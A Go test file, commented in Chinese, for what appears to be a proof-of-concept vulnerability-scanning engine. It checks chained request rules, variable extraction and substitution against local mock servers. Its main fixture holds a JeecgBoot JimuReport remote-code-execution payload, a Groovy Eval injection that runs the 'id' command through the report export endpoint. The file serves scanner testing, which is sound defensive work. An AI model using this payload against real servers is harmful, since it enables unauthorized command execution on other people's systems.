package engine

import (
	"context"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"pocworkbench/internal/model"
)

// jeecgChainedSpec 两步串联：list 接口返回随机 id，export 接口校验 id 与命令回显。
func jeecgChainedSpec() *model.Spec {
	return &model.Spec{
		Transport: "http",
		Rules: map[string]model.Rule{
			"get_id": {
				Request:    model.Request{Method: "GET", Path: "/jeecg-boot/jmreport/excelQueryByTemplate?name=&pageNo=1&pageSize=10"},
				Extract:    map[string]string{"rid": `"id":"(\d+)"`},
				Expression: "response.status == 200",
			},
			"rce": {
				Request: model.Request{
					Method:  "POST",
					Path:    "/jeecg-boot/jmreport/auto/export",
					Headers: map[string]string{"Content-Type": "application/json"},
					Body:    `{"reportParams":[{"id":"{{rid}}","params":{"x":"=use groovy.util.Eval; Eval.me('throw new RuntimeException(\"id\".execute().text)')"},"exportType":"pdf"}]}`,
				},
				Expression: "response.body.bcontains(b'uid=')",
			},
		},
		Expression: "get_id() && rce()",
	}
}

// 端到端：串联模板的 id 随目标变化，引擎必须先取后用。
func TestChainedExtractAndSubstitute(t *testing.T) {
	var capturedID string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/jeecg-boot/jmreport/excelQueryByTemplate":
			// 每次启动都是不同的 id —— 写死 id 的 PoC 在这里必然失败
			fmt.Fprint(w, `{"records":[{"id":"8872634","name":"月度报表"}]}`)
		case "/jeecg-boot/jmreport/auto/export":
			buf := make([]byte, 4096)
			n, _ := r.Body.Read(buf)
			body := string(buf[:n])
			capturedID = body
			if strings.Contains(body, `"id":"8872634"`) {
				fmt.Fprint(w, "java_uid=0(root) error stack uid=0(root)") // 命令回显证据
				return
			}
			fmt.Fprint(w, `{"error":"template not found"}`)
		default:
			http.NotFound(w, r)
		}
	}))
	defer srv.Close()

	e := New(Options{})
	res := e.Run(context.Background(), jeecgChainedSpec(), srv.URL)
	if res.Result != "hit" {
		t.Fatalf("串联应命中 got=%s log=\n%s", res.Result, res.Log)
	}
	if !strings.Contains(capturedID, `"id":"8872634"`) {
		t.Fatalf("第二步请求应携带提取的 id, got body: %s", capturedID)
	}
	// 日志应能看到提取值与代入后的请求
	if !strings.Contains(res.Log, "extract rid=8872634") {
		t.Fatalf("日志应含提取值: %s", res.Log)
	}
}

// 提取失败：list 响应不含可提取的 id → 下游不发请求、整轮 error（而非畸形 POST）。
func TestChainedExtractFailureAborts(t *testing.T) {
	exportHit := false
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/jeecg-boot/jmreport/excelQueryByTemplate":
			fmt.Fprint(w, `{"records":[]}`) // 无 id 可提取
		case "/jeecg-boot/jmreport/auto/export":
			exportHit = true
			fmt.Fprint(w, "x")
		default:
			http.NotFound(w, r)
		}
	}))
	defer srv.Close()

	e := New(Options{})
	res := e.Run(context.Background(), jeecgChainedSpec(), srv.URL)
	if res.Result != "error" {
		t.Fatalf("提取失败应整轮 error got=%s", res.Result)
	}
	if exportHit {
		t.Fatal("提取失败后不得再发第二步请求（畸形请求污染目标日志）")
	}
	if !strings.Contains(res.Log, "提取失败") {
		t.Fatalf("日志应明示提取失败: %s", res.Log)
	}
}

// 首规则判定失败（expression 为 false）时短路行为不变：下游同样不执行。
func TestChainedPredicateFalseShortCircuits(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/jeecg-boot/jmreport/excelQueryByTemplate":
			w.WriteHeader(500) // expression status==200 为 false
		case "/jeecg-boot/jmreport/auto/export":
			t.Error("get_id 为假时 rce 不应执行")
		default:
			http.NotFound(w, r)
		}
	}))
	defer srv.Close()

	e := New(Options{})
	res := e.Run(context.Background(), jeecgChainedSpec(), srv.URL)
	if res.Result != "miss" {
		t.Fatalf("应 miss got=%s", res.Result)
	}
}

// 三步链：a 提取 → b 引用 a 并提取 → c 同时引用 a、b（多级依赖传递）。
func TestChainedThreeSteps(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/a":
			fmt.Fprint(w, "token=abc123")
		case "/b":
			if strings.Contains(r.URL.RawQuery, "tk=abc123") {
				fmt.Fprint(w, "session_id=xyz789")
				return
			}
			fmt.Fprint(w, "bad")
		case "/c":
			buf := make([]byte, 256)
			n, _ := r.Body.Read(buf)
			if strings.Contains(string(buf[:n]), "abc123|xyz789") {
				fmt.Fprint(w, "OK-PROOF")
				return
			}
			fmt.Fprint(w, "no")
		default:
			http.NotFound(w, r)
		}
	}))
	defer srv.Close()

	spec := &model.Spec{
		Transport: "http",
		Rules: map[string]model.Rule{
			"a": {
				Request:    model.Request{Method: "GET", Path: "/a"},
				Extract:    map[string]string{"tk": `token=(\w+)`},
				Expression: "response.status == 200",
			},
			"b": {
				Request:    model.Request{Method: "GET", Path: "/b?tk={{tk}}"},
				Extract:    map[string]string{"sid": `session_id=(\w+)`},
				Expression: "response.status == 200",
			},
			"c": {
				Request:    model.Request{Method: "POST", Path: "/c", Body: "{{tk}}|{{sid}}"},
				Expression: "response.body.bcontains(b'OK-PROOF')",
			},
		},
		Expression: "a() && b() && c()",
	}
	e := New(Options{})
	res := e.Run(context.Background(), spec, srv.URL)
	if res.Result != "hit" {
		t.Fatalf("三步链应命中 got=%s log=\n%s", res.Result, res.Log)
	}
}

// 替换语义：值原样字节替换，不做 URL 编码（/ 与 + 若被编码会变 %2F/%2B）；头部值同样可替换。
func TestSubstituteNoEncodingAndHeaders(t *testing.T) {
	var gotUA, gotQuery string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/a":
			fmt.Fprint(w, "val=a/b+c")
		case "/b":
			gotUA = r.Header.Get("User-Agent")
			gotQuery = r.URL.RawQuery
			fmt.Fprint(w, "done")
		default:
			http.NotFound(w, r)
		}
	}))
	defer srv.Close()

	spec := &model.Spec{
		Transport: "http",
		Rules: map[string]model.Rule{
			"a": {
				Request:    model.Request{Method: "GET", Path: "/a"},
				Extract:    map[string]string{"v": `val=([^\s]+)`},
				Expression: "response.status == 200",
			},
			"b": {
				Request: model.Request{
					Method:  "GET",
					Path:    "/b?q={{v}}",
					Headers: map[string]string{"User-Agent": "pocwb/{{v}}"},
				},
				Expression: "response.status == 200",
			},
		},
		Expression: "a() && b()",
	}

	e := New(Options{})
	res := e.Run(context.Background(), spec, srv.URL)
	if res.Result != "hit" {
		t.Fatalf("应命中 got=%s log=\n%s", res.Result, res.Log)
	}
	if gotQuery != "q=a/b+c" {
		t.Errorf("query 应原样替换不编码 got=%q", gotQuery)
	}
	if gotUA != "pocwb/a/b+c" {
		t.Errorf("头部值应原样替换 got=%q", gotUA)
	}
}

// || 链上左侧为假后右侧规则仍会被求值：其引用的变量已无产出，
// 此时必须跳过执行（不发裸 {{var}} 畸形请求），整轮按 miss 收场。
func TestChainedDepFalseSkipsDownstream(t *testing.T) {
	exportHit := false
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/jeecg-boot/jmreport/excelQueryByTemplate":
			w.WriteHeader(500) // get_id 判 false → rid 无产出
		case "/jeecg-boot/jmreport/auto/export":
			exportHit = true
			fmt.Fprint(w, "x")
		default:
			http.NotFound(w, r)
		}
	}))
	defer srv.Close()

	spec := jeecgChainedSpec()
	spec.Expression = "get_id() || rce()" // && 会短路到不了 rce；|| 强制右侧求值
	e := New(Options{})
	res := e.Run(context.Background(), spec, srv.URL)
	if res.Result != "miss" {
		t.Fatalf("依赖判假后跳过应 miss got=%s log=\n%s", res.Result, res.Log)
	}
	if exportHit {
		t.Fatal("变量未就绪时不得发出畸形请求")
	}
	if !strings.Contains(res.Log, "未就绪") {
		t.Fatalf("日志应明示跳过原因: %s", res.Log)
	}
}
